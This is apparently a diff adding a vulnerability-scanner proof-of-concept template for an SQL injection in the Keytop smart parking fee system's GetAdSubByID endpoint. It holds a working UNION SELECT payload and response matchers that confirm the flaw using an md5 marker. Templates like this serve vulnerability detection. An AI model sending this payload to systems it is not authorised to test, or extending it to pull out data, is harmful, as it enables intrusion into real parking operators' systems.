@@ -1,0 +1,33 @@
+id: poc-yaml-keytop-toll-system-getadsubbyid-sqli
+info:
+  name: 科拓全智能停车收费系统 GetAdSubByID SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/Webservice.asmx/GetAdSubByID"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "AID=1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,{{t2}},0x7e),NULL-- -"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "','"
+        part: body
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
